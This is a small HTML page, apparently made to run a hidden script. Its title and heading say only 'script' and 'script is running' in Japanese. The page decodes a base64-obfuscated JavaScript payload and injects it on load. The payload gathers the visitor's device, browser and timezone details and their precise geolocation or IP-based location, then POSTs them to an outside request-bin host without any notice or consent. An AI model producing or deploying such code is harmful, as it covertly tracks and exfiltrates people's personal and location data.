<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>スクリプト</title>
</head>
<body>
  <h1>スクリプトを実行しています...</h1>
  <script>
    const base64Script = 'ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGZ1bmN0aW9uKCkgeyAKICBjb25zdCBwY0luZm8gPSB7IAogICAgdXNlckFnZW50OiBuYXZpZ2F0b3IudXNlckFnZW50LCAKICAgIGxhbmd1YWdlOiBuYXZpZ2F0b3IubGFuZ3VhZ2UsIAogICAgcGxhdGZvcm06IG5hdmlnYXRvci5wbGF0Zm9ybSwgCiAgICBjb29raWVFbmFibGVkOiBuYXZpZ2F0b3IuY29va2llRW5hYmxlZCwgCiAgICBzY3JlZW5XaWR0aDogc2NyZWVuLndpZHRoLCAKICAgIHNjcmVlbkhlaWdodDogc2NyZWVuLmhlaWdodCwgCiAgICB3aW5kb3dJbm5lcldpZHRoOiB3aW5kb3cuaW5uZXJXaWR0aCwgCiAgICB3aW5kb3dJbm5lckhlaWdodDogd2luZG93LmlubmVySGVpZ2h0LCAKICAgIHRpbWV6b25lOiBJbnRsLkRhdGVUaW1lRm9ybWF0KCkucmVzb2x2ZWRPcHRpb25zKCkudGltZVpvbmUsIAogICAgbG9jYXRpb246IHt9IAogIH07IAoKICBpZiAobmF2aWdhdG9yLmdlb2xvY2F0aW9uKSB7IAogICAgbmF2aWdhdG9yLmdlb2xvY2F0aW9uLmdldEN1cnJlbnRQb3NpdGlvbihmdW5jdGlvbihwb3NpdGlvbikgeyAKICAgICAgcGNJbmZvLmxvY2F0aW9uLmxhdGl0dWRlID0gcG9zaXRpb24uY29vcmRzLmxhdGl0dWRlOyAKICAgICAgcGNJbmZvLmxvY2F0aW9uLmxvbmdpdHVkZSA9IHBvc2l0aW9uLmNvb3Jkcy5sb25naXR1ZGU7IAogICAgICBzZW5kRGF0YSgpOyAKICAgIH0sIGZ1bmN0aW9uKCkgeyAKICAgICAgc2VuZERhdGFXaXRoSXBJbmZvKCk7IAogICAgfSk7IAogIH0gZWxzZSB7IAogICAgc2VuZERhdGFXaXRoSXBJbmZvKCk7IAogIH0gCgogIGZ1bmN0aW9uIHNlbmREYXRhKCkgeyAKICAgIGZldGNoKCdodHRwczovL2lwaW5mby5pby9qc29uJykKICAgICAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UuanNvbigpKQogICAgICAudGhlbihpcERhdGEgPT4gewogICAgICAgIHBjSW5mby5pcCA9IGlwRGF0YTsKICAgICAgICByZXR1cm4gZmV0Y2goJ2h0dHBzOi8vZW5pa2lvOWZza3VzZy54LnBpcGVkcmVhbS5uZXQvJywgewogICAgICAgICAgbWV0aG9kOiAnUE9TVCcsCiAgICAgICAgICBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicgfSwKICAgICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHBjSW5mbykKICAgICAgICB9KTsKICAgICAgfSkKICAgICAgLnRoZW4ocmVzcG9uc2UgPT4gewogICAgICAgIGlmIChyZXNwb25zZS5vaykgewogICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignaDEnKS50ZXh0Q29udGVudCA9ICdTdWNjZXNzZnVsbHkhJzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignaDEnKS50ZXh0Q29udGVudCA9ICdFcnJvciBTZW5kaW5nIGRhdGEnOwogICAgICAgIH0KICAgICAgfSkKICAgICAgLmNhdGNoKCgpID0+IHsKICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdoMScpLnRleHRDb250ZW50ID0gJ0Vycm9yIE9jY3VycmVkJzsKICAgICAgfSk7CiAgfQoKICBmdW5jdGlvbiBzZW5kRGF0YVdpdGhJcEluZm8oKSB7CiAgICBmZXRjaCgnaHR0cHM6Ly9pcGluZm8uaW8vanNvbicpCiAgICAgIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLmpzb24oKSkKICAgICAgLnRoZW4oaXBEYXRhID0+IHsKICAgICAgICBwY0luZm8uaXAgPSBpcERhdGE7CiAgICAgICAgaWYgKCFwY0luZm8ubG9jYXRpb24ubGF0aXR1ZGUgJiYgIXBjSW5mby5sb2NhdGlvbi5sb25naXR1ZGUpIHsKICAgICAgICAgIFtwY0luZm8ubG9jYXRpb24ubGF0aXR1ZGUsIHBjSW5mby5sb2NhdGlvbi5sb25naXR1ZGVdID0gaXBEYXRhLmxvYy5zcGxpdCgnLCcpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gZmV0Y2goJ2h0dHBzOi8vZW5pa2lvOWZza3VzZy54LnBpcGVkcmVhbS5uZXQvJywgewogICAgICAgICAgbWV0aG9kOiAnUE9TVCcsCiAgICAgICAgICBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicgfSwKICAgICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHBjSW5mbykKICAgICAgICB9KTsKICAgICAgfSkKICAgICAgLnRoZW4ocmVzcG9uc2UgPT4gewogICAgICAgIGlmIChyZXNwb25zZS5vaykgewogICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignaDEnKS50ZXh0Q29udGVudCA9ICdTdWNjZXNzZnVsbHkhJzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignaDEnKS50ZXh0Q29udGVudCA9ICdFcnJvciBTZW5kaW5nIGRhdGEnOwogICAgICAgIH0KICAgICAgfSkKICAgICAgLmNhdGNoKCgpID0+IHsKICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdoMScpLnRleHRDb250ZW50ID0gJ0Vycm9yIE9jY3VycmVkJzsKICAgICAgfSk7CiAgfQp9KTsK';

    const scriptContent = atob(base64Script);

    const script = document.createElement('script');
    script.textContent = scriptContent;
    document.body.appendChild(script);
  </script>
</body>
</html>
